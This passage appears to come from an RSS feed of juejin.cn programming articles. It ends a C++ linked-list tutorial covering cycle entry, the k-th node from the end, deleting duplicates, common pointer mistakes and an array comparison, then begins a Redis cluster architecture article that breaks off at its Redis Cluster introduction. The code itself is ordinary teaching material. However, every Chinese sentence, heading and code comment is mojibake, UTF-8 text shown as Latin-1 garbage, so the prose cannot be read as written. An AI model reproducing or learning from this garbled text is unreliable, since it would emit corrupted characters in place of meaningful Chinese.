<li>è®¾å¤´èŠ‚ç‚¹åˆ°ç¯å…¥å£è·ç¦»ä¸ºaï¼Œç¯é•¿åº¦ä¸ºb</li>
<li>ç¬¬ä¸€æ¬¡ç›¸é‡æ—¶ï¼Œæ…¢æŒ‡é’ˆèµ°äº†a + xï¼Œå¿«æŒ‡é’ˆèµ°äº†a + x + nb</li>
<li>ç”±å¿«æŒ‡é’ˆé€Ÿåº¦æ˜¯æ…¢æŒ‡é’ˆä¸¤å€ï¼š2(a + x) = a + x + nb</li>
<li>å¾—åˆ°ï¼ša = (n-1)b + (b - x)</li>
<li>è®©ä¸€ä¸ªæŒ‡é’ˆä»headå¼€å§‹ï¼Œä¸€ä¸ªä»ç›¸é‡ç‚¹å¼€å§‹ï¼Œæ¯æ¬¡èµ°ä¸€æ­¥ï¼Œç›¸é‡ç‚¹å°±æ˜¯ç¯å…¥å£</li>
</ol>
<h3 data-id="heading-38">5.3 æ‰¾åˆ°å€’æ•°ç¬¬kä¸ªèŠ‚ç‚¹</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function">ListNode* <span class="hljs-title">findKthFromEnd</span><span class="hljs-params">(ListNode* head, <span class="hljs-type">int</span> k)</span> </span>{
    <span class="hljs-keyword">if</span> (!head || k &lt;= <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;
    
    ListNode* fast = head;
    ListNode* slow = head;
    
    <span class="hljs-comment">// fastå…ˆèµ°kæ­¥</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; k; i++) {
        <span class="hljs-keyword">if</span> (!fast) <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;  <span class="hljs-comment">// kå¤§äºé“¾è¡¨é•¿åº¦</span>
        fast = fast-&gt;next;
    }
    
    <span class="hljs-comment">// fastå’Œslowä¸€èµ·èµ°</span>
    <span class="hljs-keyword">while</span> (fast) {
        slow = slow-&gt;next;
        fast = fast-&gt;next;
    }
    
    <span class="hljs-keyword">return</span> slow;
}
</code></pre>
<h3 data-id="heading-39">5.4 åˆ é™¤é‡å¤èŠ‚ç‚¹</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// åˆ é™¤æ’åºé“¾è¡¨ä¸­çš„é‡å¤å…ƒç´ </span>
<span class="hljs-function">ListNode* <span class="hljs-title">deleteDuplicates</span><span class="hljs-params">(ListNode* head)</span> </span>{
    <span class="hljs-keyword">if</span> (!head) <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;
    
    ListNode* curr = head;
    
    <span class="hljs-keyword">while</span> (curr &amp;&amp; curr-&gt;next) {
        <span class="hljs-keyword">if</span> (curr-&gt;val == curr-&gt;next-&gt;val) {
            ListNode* toDelete = curr-&gt;next;
            curr-&gt;next = curr-&gt;next-&gt;next;
            <span class="hljs-keyword">delete</span> toDelete;
        } <span class="hljs-keyword">else</span> {
            curr = curr-&gt;next;
        }
    }
    
    <span class="hljs-keyword">return</span> head;
}
</code></pre>
<h2 data-id="heading-40">å…­ã€é“¾è¡¨æ“ä½œçš„å¸¸è§é”™è¯¯</h2>
<h3 data-id="heading-41">6.1 æŒ‡é’ˆæœªåˆå§‹åŒ–</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// é”™è¯¯</span>
ListNode* ptr;
cout &lt;&lt; ptr-&gt;val;  <span class="hljs-comment">// è®¿é—®éšæœºå†…å­˜ï¼Œæ®µé”™è¯¯</span>

<span class="hljs-comment">// æ­£ç¡®</span>
ListNode* ptr = <span class="hljs-literal">nullptr</span>;  <span class="hljs-comment">// æˆ– = new ListNode(0)</span>
</code></pre>
<h3 data-id="heading-42">6.2 è®¿é—®å·²é‡Šæ”¾çš„å†…å­˜</h3>
<pre><code class="hljs language-cpp" lang="cpp">ListNode* node = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>(<span class="hljs-number">1</span>);
<span class="hljs-keyword">delete</span> node;
cout &lt;&lt; node-&gt;val;  <span class="hljs-comment">// é”™è¯¯ï¼šè®¿é—®å·²é‡Šæ”¾çš„å†…å­˜</span>
</code></pre>
<h3 data-id="heading-43">6.3 å¿˜è®°æ–­å¼€è¿æ¥ï¼ˆå½¢æˆç¯ï¼‰</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// åè½¬é“¾è¡¨æ—¶å¿˜è®°æ–­å¼€åŸè¿æ¥</span>
ListNode* newHead = <span class="hljs-built_in">reverse</span>(head);
<span class="hljs-comment">// å¦‚æœåŸé“¾è¡¨æ²¡æœ‰æ­£ç¡®æ–­å¼€ï¼Œå¯èƒ½å½¢æˆç¯</span>
</code></pre>
<h3 data-id="heading-44">6.4 ä¸¢å¤±å¤´æŒ‡é’ˆ</h3>
<pre><code class="hljs language-cpp" lang="cpp">ListNode* head = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>(<span class="hljs-number">1</span>);
head = head-&gt;next;  <span class="hljs-comment">// ä¸¢å¤±äº†åŸå¤´èŠ‚ç‚¹ï¼Œå†…å­˜æ³„æ¼</span>
</code></pre>
<h2 data-id="heading-45">ä¸ƒã€é“¾è¡¨ä¸æ•°ç»„çš„å¯¹æ¯”</h2>








































<table><thead><tr><th>ç‰¹æ€§</th><th>æ•°ç»„</th><th>é“¾è¡¨</th></tr></thead><tbody><tr><td><strong>å†…å­˜åˆ†é…</strong></td><td>è¿ç»­</td><td>ç¦»æ•£</td></tr><tr><td><strong>è®¿é—®æ–¹å¼</strong></td><td>éšæœºè®¿é—®</td><td>é¡ºåºè®¿é—®</td></tr><tr><td><strong>è®¿é—®æ—¶é—´</strong></td><td>O(1)</td><td>O(n)</td></tr><tr><td><strong>æ’å…¥/åˆ é™¤</strong></td><td>O(n)</td><td>O(1)ï¼ˆå·²çŸ¥ä½ç½®ï¼‰</td></tr><tr><td><strong>å†…å­˜ä½¿ç”¨</strong></td><td>å›ºå®šå¤§å°</td><td>åŠ¨æ€å¢é•¿</td></tr><tr><td><strong>ç¼“å­˜å‹å¥½</strong></td><td>æ˜¯</td><td>å¦</td></tr></tbody></table>
<p><strong>é€‰æ‹©åŸåˆ™</strong>ï¼š</p>
<ul>
<li>éœ€è¦å¿«é€Ÿéšæœºè®¿é—® â†’ æ•°ç»„</li>
<li>éœ€è¦é¢‘ç¹æ’å…¥/åˆ é™¤ â†’ é“¾è¡¨</li>
<li>å†…å­˜ä½¿ç”¨ä¸ç¡®å®š â†’ é“¾è¡¨</li>
<li>éœ€è¦ç¼“å­˜å‹å¥½ â†’ æ•°ç»„</li>
</ul>
<p>é“¾è¡¨æ“ä½œçš„æ ¸å¿ƒæ˜¯<strong>ç†è§£æŒ‡é’ˆå…³ç³»</strong>å’Œ<strong>ç®¡ç†å†…å­˜ç”Ÿå‘½å‘¨æœŸ</strong>ã€‚æŒæ¡é“¾è¡¨çš„åŸºç¡€æ“ä½œåï¼Œå¤æ‚é—®é¢˜å¾€å¾€æ˜¯è¿™äº›åŸºç¡€æ“ä½œçš„ç»„åˆã€‚å¤šç»ƒä¹ ã€å¤šæ€è€ƒï¼Œæ‰èƒ½çœŸæ­£æŒæ¡é“¾è¡¨çš„ç²¾é«“ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Redisé›†ç¾¤æ¶æ„è¯¦è§£ï¼šä»å•æœºåˆ°åˆ†å¸ƒå¼çš„æ‰©å±•ä¹‹è·¯]]></title>    <link>https://juejin.cn/post/7580564126403248178</link>    <guid>https://juejin.cn/post/7580564126403248178</guid>    <pubDate>2025-12-08T01:11:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580564126403248178" data-draft-id="7490815158190129178" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Redisé›†ç¾¤æ¶æ„è¯¦è§£ï¼šä»å•æœºåˆ°åˆ†å¸ƒå¼çš„æ‰©å±•ä¹‹è·¯"/> <meta itemprop="keywords" content="Redis,æ•°æ®åº“,æ€§èƒ½ä¼˜åŒ–"/> <meta itemprop="datePublished" content="2025-12-08T01:11:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Goé«˜å¹¶å‘æ¶æ„_ç‹å·¥"/> <meta itemprop="url" content="https://juejin.cn/user/446863555701561"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Redisé›†ç¾¤æ¶æ„è¯¦è§£ï¼šä»å•æœºåˆ°åˆ†å¸ƒå¼çš„æ‰©å±•ä¹‹è·¯
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/446863555701561/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Goé«˜å¹¶å‘æ¶æ„_ç‹å·¥
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T01:11:13.000Z" title="Mon Dec 08 2025 01:11:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    14
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»25åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1. å¼•è¨€</h2>
<p>Redisï¼Œè¿™ä¸ªåå­—å¯¹äºè®¸å¤šå¼€å‘è€…æ¥è¯´å¹¶ä¸é™Œç”Ÿã€‚ä½œä¸ºä¸€æ¬¾é«˜æ€§èƒ½çš„å†…å­˜æ•°æ®åº“ï¼Œå®ƒä»¥ä½å»¶è¿Ÿå’Œæç®€è®¾è®¡èµ¢å¾—äº†æ— æ•°å¼€å‘è€…çš„é’çã€‚ç„¶è€Œï¼Œéšç€ä¸šåŠ¡è§„æ¨¡çš„å¢é•¿ï¼Œå•æœºRedisçš„å±€é™æ€§é€æ¸æš´éœ²ï¼Œåˆ†å¸ƒå¼é›†ç¾¤æ¶æ„åº”è¿è€Œç”Ÿã€‚è¿™ç¯‡æ–‡ç« çš„ç›®æ ‡è¯»è€…æ˜¯æœ‰1-2å¹´Rediså¼€å‘ç»éªŒçš„å¼€å‘è€…â€”â€”ä½ å¯èƒ½å·²ç»ç†Ÿç»ƒæŒæ¡äº†<code>SET</code>ã€<code>GET</code>è¿™äº›åŸºç¡€å‘½ä»¤ï¼Œä¹Ÿåœ¨å•æœºç¯å¢ƒä¸‹ä¼˜åŒ–è¿‡æ€§èƒ½ï¼Œä½†å¯¹äºå¦‚ä½•å°†Redisä»å•æœºæ‰©å±•åˆ°åˆ†å¸ƒå¼é›†ç¾¤ï¼Œæˆ–è®¸è¿˜æ„Ÿåˆ°æœ‰äº›è¿·é›¾é‡é‡ã€‚</p>
<p>ä»å•æœºåˆ°åˆ†å¸ƒå¼çš„æ¼”è¿›ï¼Œä¸ä»…ä»…æ˜¯ä¸€ä¸ªæŠ€æœ¯å‡çº§çš„è¿‡ç¨‹ï¼Œæ›´æ˜¯ä¸ºè§£å†³å®é™…ä¸šåŠ¡ç—›ç‚¹è€Œç”Ÿçš„å¿…ç„¶é€‰æ‹©ã€‚æƒ³è±¡ä¸€ä¸‹ï¼Œå•æœºRediså°±åƒä¸€è¾†è·‘è½¦ï¼Œé€Ÿåº¦å¿«ã€æ“æ§çµæ´»ï¼Œä½†è£…è½½èƒ½åŠ›æœ‰é™ï¼›è€Œé›†ç¾¤æ¶æ„åˆ™åƒä¸€æ”¯è½¦é˜Ÿï¼Œè™½ç„¶è°ƒåº¦å¤æ‚ï¼Œå´èƒ½æ‰¿è½½æ›´å¤šè´§ç‰©ï¼Œè·‘å¾—æ›´è¿œã€‚Redisä»æœ€åˆçš„å•æœºæ¨¡å¼ï¼Œåˆ°æ”¯æŒä¸»ä»å¤åˆ¶ã€å“¨å…µæœºåˆ¶ï¼Œå†åˆ°å¦‚ä»Šçš„Redis Clusterï¼Œæ¯ä¸€æ­¥éƒ½åœ¨è§£å†³å®¹é‡ã€æ€§èƒ½å’Œé«˜å¯ç”¨æ€§çš„éš¾é¢˜ã€‚é‚£ä¹ˆï¼Œè¿™æ¡æ‰©å±•ä¹‹è·¯ç©¶ç«Ÿæœ‰å“ªäº›å…³é”®èŠ‚ç‚¹ï¼Ÿæˆ‘ä»¬åˆè¯¥å¦‚ä½•åœ¨å®è·µä¸­é©¾é©­å®ƒï¼Ÿ</p>
<p>åœ¨è¿™ç¯‡æ–‡ç« ä¸­ï¼Œæˆ‘å°†ä»å•æœºRedisçš„å±€é™æ€§è®²èµ·ï¼Œé€æ­¥å‰–æRedisé›†ç¾¤çš„æ ¸å¿ƒæ¦‚å¿µã€æ­å»ºæ–¹æ³•å’Œä¼˜åŒ–å®è·µã€‚å†…å®¹ä¸ä»…åŸºäºå®˜æ–¹æ–‡æ¡£å’ŒæŠ€æœ¯åŸç†ï¼Œæ›´èå…¥äº†æˆ‘10å¹´Rediså¼€å‘ç»éªŒä¸­çš„çœŸå®æ¡ˆä¾‹ã€‚æ¯”å¦‚ï¼Œæˆ‘æ›¾åœ¨ä¸€ä¸ªç”µå•†é¡¹ç›®ä¸­ï¼Œé¢å¯¹ç§’æ€æµé‡æ¿€å¢å¯¼è‡´å•æœºRediså†…å­˜çˆ†æ»¡çš„çª˜å¢ƒï¼Œæœ€ç»ˆé€šè¿‡é›†ç¾¤æ¶æ„åŒ–é™©ä¸ºå¤·ã€‚è¿™äº›ç»éªŒæ•™è®­ï¼Œå°†ä¸ºä½ æä¾›æ›´æ¥åœ°æ°”çš„å‚è€ƒã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†ä¸€èµ·æ¢ç´¢Redisé›†ç¾¤çš„å¥¥ç§˜ï¼Œçœ‹çœ‹å®ƒå¦‚ä½•ä»å•å…µä½œæˆ˜è¿›åŒ–åˆ°åˆ†å¸ƒå¼ååŒçš„å¼ºå¤§é˜µå®¹ã€‚</p>
<hr/>
<h2 data-id="heading-1">2. å•æœºRedisçš„å±€é™æ€§ä¸åˆ†å¸ƒå¼éœ€æ±‚</h2>
<h3 data-id="heading-2">å•æœºRedisçš„ä¼˜åŠ¿ä¸ç“¶é¢ˆ</h3>
<p>Redisçš„å•æœºæ¨¡å¼ä¹‹æ‰€ä»¥å¹¿å—æ¬¢è¿ï¼Œç¦»ä¸å¼€å®ƒçš„å‡ ä¸ªæ˜¾è‘—ä¼˜åŠ¿ã€‚é¦–å…ˆæ˜¯<strong>ç®€å•</strong>ï¼šæ— éœ€å¤æ‚é…ç½®ï¼Œå®‰è£…åå³å¯ä½¿ç”¨ï¼Œå¼€å‘è€…å¯ä»¥å¿«é€Ÿä¸Šæ‰‹ã€‚å…¶æ¬¡æ˜¯<strong>é«˜æ€§èƒ½</strong>ï¼šåŸºäºå†…å­˜æ“ä½œï¼Œå•çº¿ç¨‹æ¨¡å‹é¿å…äº†ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼Œè¯»å†™å»¶è¿Ÿé€šå¸¸åœ¨å¾®ç§’çº§åˆ«ã€‚æœ€åæ˜¯<strong>ä½å»¶è¿Ÿ</strong>ï¼šæ‰€æœ‰æ•°æ®éƒ½åœ¨å†…å­˜ä¸­ï¼Œå“åº”é€Ÿåº¦è¿œè¶…ç£ç›˜æ•°æ®åº“ã€‚</p>
<p>ç„¶è€Œï¼Œå¤©ä¸‹æ²¡æœ‰å®Œç¾çš„æŠ€æœ¯ã€‚å•æœºRedisçš„ç“¶é¢ˆä¹ŸåŒæ ·æ˜æ˜¾ã€‚<strong>å†…å­˜å®¹é‡å—é™</strong>æ˜¯é¦–è¦é—®é¢˜â€”â€”ä¸€å°æœåŠ¡å™¨çš„å†…å­˜ç»ˆç©¶æœ‰é™ï¼Œå½“æ•°æ®é‡è¶…è¿‡ç‰©ç†ä¸Šé™æ—¶ï¼Œä½ åªèƒ½çœ¼çççœ‹ç€æ€§èƒ½ä¸‹é™ç”šè‡³å®•æœºã€‚<strong>å•ç‚¹æ•…éšœ</strong>æ˜¯å¦ä¸€ä¸ªéšæ‚£ï¼Œä¸€æ—¦æœåŠ¡å™¨å®•æœºï¼ŒæœåŠ¡å°±å½»åº•ä¸å¯ç”¨ã€‚æ­¤å¤–ï¼Œ<strong>QPSä¸Šé™</strong>ä¹Ÿä¸å®¹å¿½è§†ï¼Œå•çº¿ç¨‹æ¨¡å‹è™½ç„¶é«˜æ•ˆï¼Œä½†åœ¨é«˜å¹¶å‘åœºæ™¯ä¸‹ï¼Œå•æœºçš„å¤„ç†èƒ½åŠ›è¿Ÿæ—©ä¼šè§¦ç¢°åˆ°å¤©èŠ±æ¿ã€‚</p>
<h3 data-id="heading-3">å®é™…åœºæ™¯ä¸¾ä¾‹</h3>
<p>æˆ‘æ›¾åœ¨æ—©æœŸçš„ä¸€ä¸ªç”µå•†ç§’æ€é¡¹ç›®ä¸­æ·±åˆ»ä½“ä¼šåˆ°è¿™äº›å±€é™æ€§ã€‚å½“æ—¶ï¼Œæˆ‘ä»¬ç”¨ä¸€å°16GBå†…å­˜çš„Rediså®ä¾‹å­˜å‚¨å•†å“åº“å­˜å’Œç”¨æˆ·è®¢å•æ•°æ®ã€‚ç§’æ€å¼€å§‹åï¼Œç¬æ—¶æµé‡æ¿€å¢ï¼Œå†…å­˜ä½¿ç”¨ç‡è¿…é€Ÿé£™å‡åˆ°100%ï¼Œç´§æ¥ç€Redisè¿›ç¨‹å´©æºƒï¼ŒæœåŠ¡ç›´æ¥ç˜«ç—ªã€‚äº‹ååˆ†æå‘ç°ï¼Œåº“å­˜Keyçš„é¢‘ç¹æ›´æ–°å’Œè®¢å•æ•°æ®çš„å¿«é€Ÿç´¯ç§¯ï¼Œè®©å•æœºRedisä¸å ªé‡è´Ÿã€‚è¿™æ¬¡äº‹æ•…è®©æˆ‘æ„è¯†åˆ°ï¼Œå•æœºæ¨¡å¼åœ¨é¢å¯¹å¤§è§„æ¨¡ã€é«˜å¹¶å‘åœºæ™¯æ—¶ï¼Œå®åœ¨æ˜¯â€œç‹¬æœ¨éš¾æ”¯â€ã€‚</p>
<h3 data-id="heading-4">åˆ†å¸ƒå¼éœ€æ±‚é©±åŠ¨</h3>
<p>é‚£ä¹ˆï¼Œä»€ä¹ˆæ ·çš„éœ€æ±‚æ¨åŠ¨äº†Rediså‘åˆ†å¸ƒå¼æ¼”è¿›å‘¢ï¼Ÿé¦–å…ˆæ˜¯<strong>æ•°æ®é‡å¢é•¿</strong>ï¼šä¸šåŠ¡å‘å±•å¸¦æ¥ç”¨æˆ·å’Œæ•°æ®çš„æŒ‡æ•°çº§å¢åŠ ï¼Œå•æœºå†…å­˜å·²æ— æ³•æ»¡è¶³å­˜å‚¨éœ€æ±‚ã€‚å…¶æ¬¡æ˜¯<strong>é«˜å¯ç”¨æ€§è¦æ±‚</strong>ï¼šç°ä»£åº”ç”¨å¯¹æœåŠ¡ä¸­æ–­çš„å®¹å¿åº¦æä½ï¼Œå•ç‚¹æ•…éšœçš„é£é™©å¿…é¡»è¢«æ¶ˆé™¤ã€‚æœ€åæ˜¯<strong>è´Ÿè½½å‡è¡¡çš„å¿…è¦æ€§</strong>ï¼šå°†è¯·æ±‚åˆ†æ•£åˆ°å¤šä¸ªèŠ‚ç‚¹ï¼Œæ—¢èƒ½æå‡æ•´ä½“ååé‡ï¼Œåˆèƒ½é¿å…å•èŠ‚ç‚¹è¿‡è½½ã€‚</p>
<h3 data-id="heading-5">è¿‡æ¸¡åˆ°é›†ç¾¤çš„æ„ä¹‰</h3>
<p>ä»å•æœºåˆ°åˆ†å¸ƒå¼é›†ç¾¤çš„è½¬å˜ï¼Œä¸ä»…ä»…æ˜¯æŠ€æœ¯å±‚é¢çš„å‡çº§ï¼Œæ›´æ˜¯ä¸ºä¸šåŠ¡ä¿é©¾æŠ¤èˆªçš„å…³é”®ä¸€æ­¥ã€‚å°±åƒä»ç‹¬å¥è½¬å‘äº¤å“ä¹å›¢ï¼Œå•æœºRedisæ“…é•¿ç‹¬å½“ä¸€é¢ï¼Œè€Œé›†ç¾¤æ¶æ„åˆ™é€šè¿‡åä½œé‡Šæ”¾æ›´å¤§çš„æ½œåŠ›ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†æ·±å…¥æ¢è®¨Redis Clusterçš„æ ¸å¿ƒæ¦‚å¿µï¼Œçœ‹çœ‹å®ƒå¦‚ä½•é€šè¿‡åˆ†å¸ƒå¼è®¾è®¡è§£å†³è¿™äº›ç—›ç‚¹ï¼Œå¹¶ä¸ºç³»ç»Ÿæ‰©å±•æ‰“å¼€æ–°çš„å¯èƒ½æ€§ã€‚</p>
<hr/>
<h3 data-id="heading-6">ç¤ºæ„å›¾ï¼šå•æœºRedisçš„ç“¶é¢ˆ</h3>

























<table><thead><tr><th><strong>ç»´åº¦</strong></th><th><strong>å•æœºRedis</strong></th><th><strong>æ½œåœ¨é—®é¢˜</strong></th></tr></thead><tbody><tr><td>å†…å­˜å®¹é‡</td><td>å•æœºç‰©ç†å†…å­˜ä¸Šé™</td><td>æ•°æ®é‡è¶…é™å¯¼è‡´æº¢å‡ºæˆ–å®•æœº</td></tr><tr><td>å¯ç”¨æ€§</td><td>å•ç‚¹è¿è¡Œ</td><td>å®•æœºå³æœåŠ¡ä¸å¯ç”¨</td></tr><tr><td>æ€§èƒ½</td><td>å•çº¿ç¨‹QPSæœ‰é™</td><td>é«˜å¹¶å‘ä¸‹å“åº”å˜æ…¢</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-7">è¿‡æ¸¡æ®µ</h3>
<p>å•æœºRedisçš„å±€é™æ€§è®©æˆ‘ä»¬çœ‹åˆ°äº†åˆ†å¸ƒå¼æ¶æ„çš„å¿…è¦æ€§ï¼Œä½†å¦‚ä½•å®ç°è¿™ä¸€è·¨è¶Šå‘¢ï¼ŸRedis Clusterä½œä¸ºå®˜æ–¹æä¾›çš„åˆ†å¸ƒå¼è§£å†³æ–¹æ¡ˆï¼Œä»¥å…¶ç‹¬ç‰¹çš„è®¾è®¡å’Œå¼ºå¤§çš„åŠŸèƒ½ï¼Œæˆä¸ºäº†ä»å•æœºè¿ˆå‘åˆ†å¸ƒå¼çš„æ¡¥æ¢ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†è¯¦ç»†å‰–æå®ƒçš„æ ¸å¿ƒæ¦‚å¿µå’Œä¼˜åŠ¿ï¼Œçœ‹çœ‹å®ƒå¦‚ä½•ä¸ºå¼€å‘è€…æä¾›ä¸€ä¸ªæ—¢çµæ´»åˆå¯é çš„å·¥å…·ç®±ã€‚</p>
<hr/>
<h2 data-id="heading-8">3. Redisé›†ç¾¤æ¶æ„çš„æ ¸å¿ƒæ¦‚å¿µä¸ä¼˜åŠ¿</h2>
<p>ä»å•æœºRedisçš„å±€é™æ€§ä¸­èµ°å‡ºæ¥ï¼ŒRedis Clusterä¸ºæˆ‘ä»¬æ‰“å¼€äº†ä¸€æ‰‡é€šå¾€åˆ†å¸ƒå¼ä¸–ç•Œçš„å¤§é—¨ã€‚å®ƒä¸ä»…è§£å†³äº†å®¹é‡å’Œå¯ç”¨æ€§çš„ç“¶é¢ˆï¼Œè¿˜å¸¦æ¥äº†çµæ´»æ‰©å±•çš„èƒ½åŠ›ã€‚é‚£ä¹ˆï¼ŒRedis Clusterç©¶ç«Ÿæ˜¯ä»€ä¹ˆï¼Ÿå®ƒæœ‰å“ªäº›æ ¸å¿ƒä¼˜åŠ¿ï¼Ÿåˆå¦‚ä½•åœ¨å®é™…é¡¹ç›®ä¸­å‘æŒ¥ä½œç”¨ï¼Ÿè®©æˆ‘ä»¬ä¸€æ­¥æ­¥æ­å¼€å®ƒçš„é¢çº±ã€‚</p>
<h3 data-id="heading-9">Redis Clusterç®€ä»‹</h3>
